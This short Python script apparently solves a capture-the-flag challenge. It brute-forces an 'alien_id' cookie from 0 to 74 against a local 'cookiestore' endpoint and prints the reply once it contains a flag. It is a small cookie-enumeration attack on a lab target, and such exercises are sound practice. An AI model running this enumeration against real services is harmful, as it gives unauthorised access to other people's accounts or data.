import urllib.request

num = 1

for num in range(75):
	req = urllib.request.Request('http://127.0.0.1:8082/cookiestore')
	req.add_header("Cookie", "alien_id = " + str(num))
	res = urllib.request.urlopen(req)
	data = str(res.read(), 'utf-8')
	if "flag" in data:
		print(data)
		break